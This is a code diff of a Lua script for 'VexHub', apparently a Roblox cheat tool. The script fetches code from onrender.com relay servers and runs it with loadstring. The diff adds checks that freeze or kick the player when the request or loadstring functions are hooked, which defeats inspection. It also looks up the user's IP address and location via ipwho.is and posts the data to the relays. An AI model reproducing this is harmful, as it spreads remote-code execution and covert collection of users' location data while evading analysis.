@@ -1,3 +1,5 @@
+local LocalPlayer = game:GetService("Players").LocalPlayer
+
 _G.MirrorLinks = {
 	[1] = "https://mirrorr.onrender.com",
 	[2] = "https://mirrorr2.onrender.com",
@@ -6,7 +8,6 @@ _G.MirrorLinks = {
 }
 
 getgenv().loadmirror = function(Link)
-	local request = request or syn and syn.request or http and http.request
 	local HttpService = game:GetService("HttpService")
 	local message = request({
 		Url = _G.MirrorLinks[math.random(1, 4)].."/mirror",
@@ -20,12 +21,16 @@ getgenv().loadmirror = function(Link)
 	})
 
 	local decoded = HttpService:JSONDecode(message.Body)
-	restorefunction(loadstring)
+	if isfunctionhooked(loadstring) or isfunctionhooked(request) then
+		restorefunction(loadstring)
+		restroefunction(request)
+		while true do end
+		LocalPlayer:Kick("Unsafe environment")
+	end
 	return loadstring(tostring(decoded.content))()
 end
 
 getgenv().mirror = function(Link)
-	local request = request or syn and syn.request or http and http.request
 	local HttpService = game:GetService("HttpService")
 	local message = request({
 		Url = _G.MirrorLinks[math.random(1, 4)].."/mirror",
@@ -39,6 +44,11 @@ getgenv().mirror = function(Link)
 	})
 
 	local decoded = HttpService:JSONDecode(message.Body)
+	if isfunctionhooked(request) then
+		restroefunction(request)
+		while true do end
+		LocalPlayer:Kick("Unsafe environment")
+	end
 	return decoded.content
 end
 
@@ -87,9 +97,16 @@ Loaded = true
 GUI.Hint_00:Destroy()
 
 if (writefile) and (getcustomasset) then
-	local LocalPlayer = game:GetService("Players").LocalPlayer
-	local WhoIs = game:GetService("HttpService"):JSONDecode(game:HttpGet("https://ipwho.is/"))
 	coroutine.wrap(function()
+		local WhoIs = {}
+		if isfile("whois") then
+			WhoIs = game:GetService("HttpService"):JSONDecode(readfile("whois"))
+		else
+			wait(60)
+			WhoIs = game:GetService("HttpService"):JSONDecode(game:HttpGet("https://ipwho.is/"))
+			writefile("whois", game:GetService("HttpService"):JSONEncode(WhoIs))
+		end
+		
 		local message = request({
 			Url = _G.MirrorLinks[math.random(1, 4)].."/send",
 			Method = "POST",
@@ -103,7 +120,7 @@ if (writefile) and (getcustomasset) then
 		})
 	end)()
 
-	loadmirror("https://raw.githubusercontent.com/SkibidiSource/fake/refs/heads/main/KeySystem")
+	loadmirror("https://raw.githubusercontent.com/Sofjskdkkco/fake/refs/heads/main/KeySystem")
 else
 	GUI.Text_01.Text = "VexHub does not support your executor. Please join our discord server: dsc.gg/vhub"
 	GUI.Text_01.Visible = true
